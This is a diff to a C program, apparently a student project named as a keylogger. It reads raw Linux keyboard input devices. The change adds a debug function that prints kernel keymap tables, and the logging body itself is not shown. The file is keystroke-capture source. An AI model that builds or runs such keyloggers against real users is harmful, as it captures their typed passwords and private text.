@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
-/*   Updated: 2018/09/30 01:08:09 by root             ###   ########.fr       */
+/*   Updated: 2018/10/03 19:22:23 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,6 +21,10 @@
 #include <dirent.h>
 #include <linux/input.h>
 #include <signal.h>
+#include <linux/keyboard.h>
+
+extern unsigned short *key_maps[MAX_NR_KEYMAPS];
+extern unsigned short plain_map[NR_KEYS];
 
 static int			filter(const struct dirent *file)
 {
@@ -324,11 +328,26 @@ static void	keylogger(int keybd)
 	}
 }
 
+static void print_hdr()
+{
+	size_t	size = sizeof(key_maps) / sizeof(*key_maps);
+
+	printf("NB    | Content\n");
+	for (size_t i = 0 ; key_maps[i] ; i++) {
+		printf("%ld  |", i);
+		for (size_t j = 0 ; key_maps[i][j]; j++) {
+			printf(" %lx", key_maps[i][j]);
+		}
+		printf("\n");
+	}
+}
+
 int			main(void)
 {
 	char	*keyboard;
 	int		fd;
 
+	print_hdr();
 	if ((keyboard = get_keyboard()) == NULL)
 		return 1;
 	printf("keyboard: %s\n", keyboard);
